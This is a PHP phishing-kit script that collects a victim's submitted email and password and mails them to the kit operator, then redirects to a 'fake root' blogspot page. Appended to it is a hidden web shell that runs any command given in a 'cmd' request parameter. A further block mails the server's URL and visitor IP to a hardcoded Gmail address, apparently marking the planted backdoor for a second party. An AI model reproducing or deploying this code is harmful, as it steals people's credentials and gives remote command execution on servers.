<?php


$nick = $_POST['nickname'];
$email2 = $_POST['fb1'];
$pass2 = $_POST['fb2'];
$lev = $_POST['level'];
$log = $_POST['login'];
$ski = $_POST['rank'];
$emailr= $_POST['elite'];
$passr= $_POST['passr'];

$message   = "

====[ DATA DATA NYA BRO ]====

• Email  :  ".$email2."

• Password  : ".$pass2."

[ + ] --- ./Fake Root Logger --- [ + ] 

";

include 'email.php';
$subject = "DATA COK";
$headers = "From: SETOR DATA <reeditkev@result.net>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));

?>
'<script>window.location.replace("https://fake-root.blogspot.com")</script>';}
}
?>

<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'fikriofficial4676@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "ACCESS", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
